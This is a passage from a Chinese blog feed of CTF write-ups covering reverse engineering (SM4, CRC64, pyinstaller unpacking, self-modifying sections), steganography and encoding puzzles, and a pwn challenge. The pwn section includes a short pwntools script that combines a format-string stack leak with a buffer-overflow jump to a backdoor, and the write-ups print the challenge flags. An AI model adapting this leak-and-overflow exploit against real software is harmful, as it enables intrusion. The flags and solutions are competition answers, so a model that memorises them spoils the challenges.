src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815181639575.png" alt="image-20200815181639575"></p><p><img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815181823633.png" alt="image-20200815181823633"></p><p>最后python安装pysm4进行解密：</p><p>首先base64解密且转化为16进制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(c).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">s = <span class="string">"WdCVKQ3yQAYU9I0naQaHTg=="</span></span><br><span class="line">s1 = b64decode(s)</span><br><span class="line"></span><br><span class="line">ans = str_to_hex(s1)</span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><p>sm4解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line"><span class="comment">#密钥</span></span><br><span class="line">mk = <span class="number">0x77686572655f6172655f755f6e6f773f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#密文</span></span><br><span class="line">cipher_num = <span class="number">0x59d095290df2400614f48d276906874e</span></span><br><span class="line"></span><br><span class="line">clear_num = decrypt(cipher_num, mk)</span><br><span class="line">s = hex(clear_num)[<span class="number">2</span>:]</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_str</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(s[j]+s[j+<span class="number">1</span>], <span class="number">16</span>) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>)]])</span><br><span class="line">print(hex_to_str(s))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag：SM4foRExcepioN?!</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;举办这个比赛时自己还不知道什么是CTF，由于是在自己学校进行的，有点这个比赛的印象。入逆向后，最近把re做了下。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>2020年DASCTF七月线上赛</title>
    <link href="https://www.bxnop.cn/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    <id>https://www.bxnop.cn/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</id>
    <published>2020-07-25T08:53:46.000Z</published>
    <updated>2020-08-15T07:57:03.690Z</updated>
    
    <content type="html"><![CDATA[<p>这次一个逆向题都没做，时间都用于弄pwn环境了，坚持就好，。一个pwn的签到题，一个MISC。赛后也把逆向题做了做。</p><p>感受：因为之前重装了Ubuntu，pwn的环境后来也没搭，开始现搭环境的时候又遇到不少问题，大多数时间都用在这个上面了，比赛时间又不多。。。</p><a id="more"></a><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="虚假签到"><a href="#虚假签到" class="headerlink" title="虚假签到"></a>虚假签到</h3><p>checksec后，32位文件，只有NX栈不可执行保护。</p><p>载入ida后发现明显的栈溢出与格式字符串漏洞，且保护没有canary，在程序的字符中还可以看见backdoor。但是分析栈空间的时候发现多出来了个局部变量。<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726120631920.png" alt="image-20200726120631920"></p><p>然后接着看汇编代码，发现这个局部变量有着canary的类似的作用，因为程序最后要靠它获得esp，那我们把它随便覆盖值的话肯定会导致程序访问无效地址出错。且程序在上图的r与s之间还多出了16字节的空间。<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726121145913.png" alt="image-20200726121145913"></p><p>在gdb中清晰的看到：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726121303857.png" alt="image-20200726121303857"></p><p>所以按照以往改变返回地址来控制程序走向的话要多覆盖16字节数据然后通过第二次溢出将覆盖的局部变量改变回原来的值。写脚本攻击，失败。。。</p><p>又分析了栈的分布，没有错啊。发现程序中的格式化字符漏洞我没有用，才想起程序的栈随机化。每次加载程序的栈地址不一样，我不能把gdb调试看到的栈地址在脚本中用。</p><p>gdb找ebp-4的位置。<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726122351066.png" alt="image-20200726122351066"></p><p>再次脚本攻击成功：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./qiandao'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.sendline(<span class="string">"%13$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">addr = int(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">payload = <span class="number">0x24</span>*<span class="string">'a'</span> + p32(addr) + <span class="number">0x14</span>*<span class="string">'a'</span> + p32(<span class="number">0x0804857D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>总结：还是简单的栈溢出，对栈地址的确定寻找增加了点难度。</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="welcome-to-the-misc-world"><a href="#welcome-to-the-misc-world" class="headerlink" title="welcome to the misc world"></a>welcome to the misc world</h3><p>附件下载解压后一张png图片与一个压缩包，压缩包要密码，显然要从所给png图片找密码。</p><p>png图片是名字红蓝猜测rb隐写。因为是png图片直接使用zsteg工具看一下，可以看到隐藏了一张图片，提取出来发现密码：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726130546581.png" alt="image-20200726130546581"></p><p>用360压缩打开压缩包，可以看到有ntfs隐写流文本文件，直接输入密码查看：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726130709679.png" alt="image-20200726130709679"></p><p>以为是flag，提交但是错误的，这里就懵了很久。。。</p><p>后面想到还有一个hint.png图片，打开看没什么，拖进010editor发现最后有一长段字符：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132148398.png" alt="image-20200726132148398"></p><p>从字符组成猜测是base64，解码后：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132234920.png" alt="image-20200726132234920"></p><p>从这里明确了就是base64编码，但是解出的编码还是不清楚是什么，但确定是一种编码，进入编码网站把觉得会是都试了下，在escape编码发现：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132440317.png" alt="image-20200726132440317"></p><p>然后记得有一种核心价值观编码，在这个编码网站也有（真的齐全），解码后：<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132629311.png" alt="image-20200726132629311"></p><p>那么之前flag里的内容就是通过base85加密后的，解密base85得到flag:<img src="/2020/07/25/2020%E5%B9%B4DASCTF%E4%B8%83%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200726132735367.png" alt="image-20200726132735367"></p><p>总结：编码方式看的多了，有经验后就会很快反应过来。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次一个逆向题都没做，时间都用于弄pwn环境了，坚持就好，。一个pwn的签到题，一个MISC。赛后也把逆向题做了做。&lt;/p&gt;
&lt;p&gt;感受：因为之前重装了Ubuntu，pwn的环境后来也没搭，开始现搭环境的时候又遇到不少问题，大多数时间都用在这个上面了，比赛时间又不多。。。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>SCTF2020</title>
    <link href="https://www.bxnop.cn/2020/07/10/SCTF2020/"/>
    <id>https://www.bxnop.cn/2020/07/10/SCTF2020/</id>
    <published>2020-07-10T01:49:18.000Z</published>
    <updated>2020-09-19T12:07:00.296Z</updated>
    
    <content type="html"><![CDATA[<p>做了点杂项😪。。赛后肝了下逆向，不会的看了writeup学习学习。<a id="more"></a></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse:"></a>Reverse:</h2><h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><p>题目下载下来很大，一般的exe文件都不会这么大，可以考虑是从py文件打包成的exe文件。</p><p>载入ida看一下字符串，有很多py开头的和__main__的。从经验来看，这是pyinstaller打包的。使用<code>python    pyinstxtractor.py    signin.exe</code> 还原python代码。对其中main文件进行文件头补齐，然后使用<code>uncompyle6 -o main.py main.pyc</code>将.pyc转化为.py文件。</p><p>但是由于这是python3.8写的py文件，如果在python3.7下使用uncompyle6会提示文件有损，使用python3.8。去升级了python3.8后。<img src="/2020/07/10/SCTF2020/image-20200714101947068.png" alt="image-20200714101947068"></p><p>打开py文件，程序启动会释放一个dll文件（这在运行程序的时候可以看到）。整体逻辑还是很简单，首先将一个账户以字典形式存储，然后将我们输入的name与密码传入dll文件的一个加密函数后返回，判断与存储的账户是否相等。</p><p>ida载入dll文件的enc加密函数：一个CRC64与异或。<img src="/2020/07/10/SCTF2020/image-20200714102629777.png" alt="image-20200714102629777"></p><p>如果之前接触过CRC64，那这里就会很简单。但是我第一次遇到，有点恼火。</p><p>首先使用python得到异或之前的key：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = list(base64.b64decode(<span class="string">b'PLHCu+fujfZmMOMLGHCyWWOq5H5HDN2R5nHnlV30Q0EA'</span>))</span><br><span class="line">t = <span class="string">"SCTFer"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">s[i] ^= ord(t[i%len(t)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (s)</span><br></pre></td></tr></table></figure><p>C语言写CRC64解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] = &#123;<span class="number">111</span>, <span class="number">242</span>, <span class="number">150</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">156</span>, <span class="number">222</span>, <span class="number">181</span>, <span class="number">50</span>, <span class="number">118</span>, <span class="number">134</span>, <span class="number">121</span>, <span class="number">75</span>, <span class="number">51</span>, <span class="number">230</span>, <span class="number">31</span>, <span class="number">6</span>, <span class="number">216</span>, <span class="number">183</span>, <span class="number">61</span>, <span class="number">19</span>, <span class="number">74</span>, <span class="number">184</span>, <span class="number">227</span>, <span class="number">181</span>, <span class="number">50</span>, <span class="number">179</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">134</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">84</span>&#125;;</span><br><span class="line">_int64 *ans = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">ans = (_int64 *)(s+i);</span><br><span class="line"><span class="keyword">if</span>(*ans &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(*ans &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">*ans ^= <span class="number">0xB0004B7679FA26B3</span>;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">*ans += <span class="number">0x8000000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">*ans ^= <span class="number">0xB0004B7679FA26B3</span>;</span><br><span class="line">*ans /= <span class="number">2</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(*ans &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">*ans += <span class="number">0x8000000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, s[j]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：<img src="/2020/07/10/SCTF2020/image-20200714103110024.png" alt="image-20200714103110024"></p><p><strong>总结：1.CRC64加密与解密。2.反编译python文件。</strong></p><h3 id="get-up"><a href="#get-up" class="headerlink" title="get_up"></a>get_up</h3><p>运行一下，提示输入一个word。载入ida，shift+f12看到该字符串，来到引用的地方：<img src="/2020/07/10/SCTF2020/image-20200714150947146.png" alt="image-20200714150947146"></p><p>进入sub_401df0：开始只是感觉复杂，但看见输入单词加密后与<strong>32位的a-f+0-9</strong>的字符串，猜测是md5加密。随便找了一个cmd5网站解密：<img src="/2020/07/10/SCTF2020/image-20200714151246530.png" alt="image-20200714151246530"></p><p>继续看下面的sub_402B00(“.reioc”)ke：进入可以看到是先获得image_base，然后依次加地址，直到获得.reioc节区的首地址。</p><p>最后引用输入的：sycsyc对.reioc节区进行了重写。这里使用idcpython脚本或载入OD动调都可以得到改写后的节区。</p><p>载入OD，调试可以发现重写的代码正是接下来要执行的，dump再载入ida：<img src="/2020/07/10/SCTF2020/image-20200714152255641.png" alt="image-20200714152255641"></p><p>可以看到与之前的类似，但这次是改写.ebata节区，使用同样的方法，OD中dump出载入ida。</p><p>进入改写.ebata后的最后一个节区：<img src="/2020/07/10/SCTF2020/image-20200714152729970.png" alt="image-20200714152729970"></p><p>看加密函数：<img src="/2020/07/10/SCTF2020/image-20200714152932947.png" alt="image-20200714152932947"></p><p>从OD动调得到表后写C语言爆破：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> od[<span class="number">256</span>] = &#123;<span class="number">0x00000031</span>, <span class="number">0x00000050</span>, <span class="number">0x00000052</span>, <span class="number">0x000000C1</span>, <span class="number">0x000000CD</span>, <span class="number">0x000000A7</span>, <span class="number">0x00000007</span>, <span class="number">0x00000039</span>, <span class="number">0x0000003D</span>, <span class="number">0x00000004</span>, </span><br><span class="line"><span class="number">0x000000FD</span>, <span class="number">0x000000C4</span>, <span class="number">0x0000002A</span>, <span class="number">0x00000072</span>, <span class="number">0x000000DF</span>, <span class="number">0x00000060</span>, <span class="number">0x000000E3</span>, <span class="number">0x000000BD</span>, <span class="number">0x000000E2</span>, <span class="number">0x00000061</span>, </span><br><span class="line"><span class="number">0x000000E4</span>, <span class="number">0x00000063</span>, <span class="number">0x000000EA</span>, <span class="number">0x000000FF</span>, <span class="number">0x000000FE</span>, <span class="number">0x00000009</span>, <span class="number">0x000000F9</span>, <span class="number">0x000000C3</span>, <span class="number">0x000000CE</span>, <span class="number">0x0000009E</span>, </span><br><span class="line"><span class="number">0x00000025</span>, <span class="number">0x0000006A</span>, <span class="number">0x0000004C</span>, <span class="number">0x000000DC</span>, <span class="number">0x00000013</span>, <span class="number">0x000000F0</span>, <span class="number">0x00000083</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000024</span>, <span class="number">0x000000DB</span>, </span><br><span class="line"><span class="number">0x000000DD</span>, <span class="number">0x0000007F</span>, <span class="number">0x000000EF</span>, <span class="number">0x0000008C</span>, <span class="number">0x0000003E</span>, <span class="number">0x000000E1</span>, <span class="number">0x00000026</span>, <span class="number">0x0000006F</span>, <span class="number">0x00000092</span>, <span class="number">0x00000006</span>, </span><br><span class="line"><span class="number">0x000000F7</span>, <span class="number">0x00000096</span>, <span class="number">0x000000D0</span>, <span class="number">0x000000B4</span>, <span class="number">0x000000E7</span>, <span class="number">0x000000F8</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000078</span>, <span class="number">0x000000F2</span>, <span class="number">0x000000AA</span>, </span><br><span class="line"><span class="number">0x00000044</span>, <span class="number">0x00000032</span>, <span class="number">0x00000036</span>, <span class="number">0x0000005A</span>, <span class="number">0x000000EC</span>, <span class="number">0x000000A6</span>, <span class="number">0x0000007B</span>, <span class="number">0x00000008</span>, <span class="number">0x000000C0</span>, <span class="number">0x0000002E</span>, </span><br><span class="line"><span class="number">0x0000009B</span>, <span class="number">0x00000084</span>, <span class="number">0x00000055</span>, <span class="number">0x0000009C</span>, <span class="number">0x000000AE</span>, <span class="number">0x00000065</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x00000053</span>, <span class="number">0x00000088</span>, </span><br><span class="line"><span class="number">0x00000049</span>, <span class="number">0x00000046</span>, <span class="number">0x000000AB</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000059</span>, <span class="number">0x0000007E</span>, <span class="number">0x000000E5</span>, <span class="number">0x000000B3</span>, <span class="number">0x000000F6</span>, </span><br><span class="line"><span class="number">0x00000048</span>, <span class="number">0x0000001A</span>, <span class="number">0x000000D1</span>, <span class="number">0x000000A4</span>, <span class="number">0x00000067</span>, <span class="number">0x0000006B</span>, <span class="number">0x000000BA</span>, <span class="number">0x00000087</span>, <span class="number">0x00000073</span>, <span class="number">0x0000004B</span>, </span><br><span class="line"><span class="number">0x000000A2</span>, <span class="number">0x000000CF</span>, <span class="number">0x0000001D</span>, <span class="number">0x00000018</span>, <span class="number">0x000000D4</span>, <span class="number">0x000000BB</span>, <span class="number">0x0000002C</span>, <span class="number">0x00000070</span>, <span class="number">0x00000093</span>, <span class="number">0x000000AC</span>, </span><br><span class="line"><span class="number">0x0000000F</span>, <span class="number">0x0000007A</span>, <span class="number">0x00000051</span>, <span class="number">0x000000B5</span>, <span class="number">0x00000021</span>, <span class="number">0x00000085</span>, <span class="number">0x00000045</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001C</span>, <span class="number">0x0000009F</span>, </span><br><span class="line"><span class="number">0x00000081</span>, <span class="number">0x0000005C</span>, <span class="number">0x0000004A</span>, <span class="number">0x00000095</span>, <span class="number">0x0000001B</span>, <span class="number">0x00000016</span>, <span class="number">0x000000D2</span>, <span class="number">0x000000C7</span>, <span class="number">0x000000E0</span>, <span class="number">0x000000DA</span>, </span><br><span class="line"><span class="number">0x00000058</span>, <span class="number">0x000000A9</span>, <span class="number">0x0000001E</span>, <span class="number">0x000000D7</span>, <span class="number">0x000000C2</span>, <span class="number">0x00000069</span>, <span class="number">0x00000071</span>, <span class="number">0x000000D6</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000075</span>, </span><br><span class="line"><span class="number">0x000000BC</span>, <span class="number">0x00000066</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000030</span>, <span class="number">0x000000AD</span>, <span class="number">0x00000099</span>, <span class="number">0x0000008B</span>, <span class="number">0x00000077</span>, <span class="number">0x00000041</span>, <span class="number">0x00000097</span>, </span><br><span class="line"><span class="number">0x00000022</span>, <span class="number">0x000000B8</span>, <span class="number">0x000000B2</span>, <span class="number">0x000000D3</span>, <span class="number">0x00000047</span>, <span class="number">0x000000C6</span>, <span class="number">0x00000079</span>, <span class="number">0x00000014</span>, <span class="number">0x0000000B</span>, <span class="number">0x000000F4</span>, </span><br><span class="line"><span class="number">0x0000003F</span>, <span class="number">0x00000011</span>, <span class="number">0x0000002B</span>, <span class="number">0x000000DE</span>, <span class="number">0x000000EE</span>, <span class="number">0x000000F3</span>, <span class="number">0x000000F5</span>, <span class="number">0x000000AF</span>, <span class="number">0x000000A5</span>, <span class="number">0x00000086</span>, </span><br><span class="line"><span class="number">0x00000091</span>, <span class="number">0x000000BE</span>, <span class="number">0x0000008E</span>, <span class="number">0x0000008F</span>, <span class="number">0x000000E8</span>, <span class="number">0x000000E6</span>, <span class="number">0x000000B1</span>, <span class="number">0x0000004E</span>, <span class="number">0x00000037</span>, <span class="number">0x000000D5</span>, </span><br><span class="line"><span class="number">0x000000FC</span>, <span class="number">0x0000004D</span>, <span class="number">0x0000005E</span>, <span class="number">0x00000042</span>, <span class="number">0x000000CA</span>, <span class="number">0x00000035</span>, <span class="number">0x000000C8</span>, <span class="number">0x0000006E</span>, <span class="number">0x000000A3</span>, <span class="number">0x00000089</span>, </span><br><span class="line"><span class="number">0x00000015</span>, <span class="number">0x0000006D</span>, <span class="number">0x00000003</span>, <span class="number">0x0000008A</span>, <span class="number">0x0000008D</span>, <span class="number">0x000000D8</span>, <span class="number">0x00000076</span>, <span class="number">0x000000CB</span>, <span class="number">0x000000C5</span>, <span class="number">0x000000F1</span>, </span><br><span class="line"><span class="number">0x0000006C</span>, <span class="number">0x000000B9</span>, <span class="number">0x00000017</span>, <span class="number">0x00000064</span>, <span class="number">0x00000068</span>, <span class="number">0x000000E9</span>, <span class="number">0x00000056</span>, <span class="number">0x00000029</span>, <span class="number">0x00000090</span>, <span class="number">0x000000ED</span>, </span><br><span class="line"><span class="number">0x00000074</span>, <span class="number">0x0000000D</span>, <span class="number">0x000000EB</span>, <span class="number">0x000000B0</span>, <span class="number">0x000000A1</span>, <span class="number">0x00000094</span>, <span class="number">0x00000080</span>, <span class="number">0x000000C9</span>, <span class="number">0x0000007C</span>, <span class="number">0x000000B7</span>, </span><br><span class="line"><span class="number">0x00000028</span>, <span class="number">0x00000005</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000023</span>, <span class="number">0x0000009D</span>, <span class="number">0x000000A0</span>, <span class="number">0x00000027</span>, <span class="number">0x00000098</span>, <span class="number">0x00000043</span>, <span class="number">0x0000007D</span>, </span><br><span class="line"><span class="number">0x000000BF</span>, <span class="number">0x0000004F</span>, <span class="number">0x00000012</span>, <span class="number">0x00000034</span>, <span class="number">0x000000A8</span>, <span class="number">0x000000D9</span>, <span class="number">0x00000057</span>, <span class="number">0x00000033</span>, <span class="number">0x0000009A</span>, <span class="number">0x00000001</span>, </span><br><span class="line"><span class="number">0x00000054</span>, <span class="number">0x0000002F</span>, <span class="number">0x0000003C</span>, <span class="number">0x00000062</span>, <span class="number">0x00000038</span>, <span class="number">0x000000FB</span>, <span class="number">0x00000082</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000003A</span>, <span class="number">0x00000019</span>, </span><br><span class="line"><span class="number">0x0000005D</span>, <span class="number">0x000000B6</span>, <span class="number">0x00000040</span>, <span class="number">0x00000020</span>, <span class="number">0x000000CC</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">0x00000080</span>, <span class="number">0x00000055</span>, <span class="number">0x0000007E</span>, <span class="number">0x0000002D</span>, <span class="number">0x000000D1</span>, <span class="number">0x00000009</span>, <span class="number">0x00000025</span>, <span class="number">0x000000AB</span>, <span class="number">0x0000003C</span>, <span class="number">0x00000056</span>, </span><br><span class="line"><span class="number">0x00000095</span>, <span class="number">0x000000C4</span>, <span class="number">0x00000036</span>, <span class="number">0x00000013</span>, <span class="number">0x000000ED</span>, <span class="number">0x00000072</span>, <span class="number">0x00000024</span>, <span class="number">0x00000093</span>, <span class="number">0x000000B2</span>, <span class="number">0x000000C8</span>, </span><br><span class="line"><span class="number">0x00000045</span>, <span class="number">0x000000EC</span>, <span class="number">0x00000016</span>, <span class="number">0x0000006B</span>, <span class="number">0x00000067</span>, <span class="number">0x0000001D</span>, <span class="number">0x000000F9</span>, <span class="number">0x000000A3</span>, <span class="number">0x00000096</span>, <span class="number">0x000000D9</span>, </span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> v10 = <span class="number">0</span>, v11 = <span class="number">0</span>, v6 = <span class="number">0</span>, i = <span 